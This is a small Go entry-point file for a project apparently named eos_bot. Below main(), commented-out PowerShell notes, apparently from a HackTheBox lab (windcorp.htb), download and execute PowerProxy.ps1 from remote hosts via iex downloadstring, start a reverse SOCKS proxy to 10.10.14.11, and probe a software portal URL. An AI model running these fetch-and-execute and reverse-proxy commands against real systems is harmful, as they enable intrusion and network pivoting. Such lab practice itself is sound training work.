package main

import (
	"eos_bot/cmd/root"
)

func main() {
	root.ExecuteCLI()
}

//iwr http://192.168.66.3/PowerProxy.ps1 -outfile PowerProxy.ps1
//start powershell -c "Import-Module ./PowerProxy.ps1; Start-ReverseSocksProxy 10.10.14.11 -Port 8080"
//start powershell -c "type .\PowerProxy.ps1"

// iex (new-object net.webclient).downloadstring("http://10.10.14.11:8000/PowerProxy.ps1") 

// powershell -c "Import-Module \\10.10.14.11:8000\PowerProxy.ps1; Start-ReverseSocksProxy 10.10.14.11 -Port 8080"

// # OR

// Import-Module \\192.168.0.22\Public\PowerProxy.ps1

//curl 172.27.208.1 -Headers @{"Host"="softwareportal.windcorp.htb"} -UseBasicParsing

//http://softwareportal.windcorp.htb/install.asp?client=172.27.212.102&analytics=Whatif.omv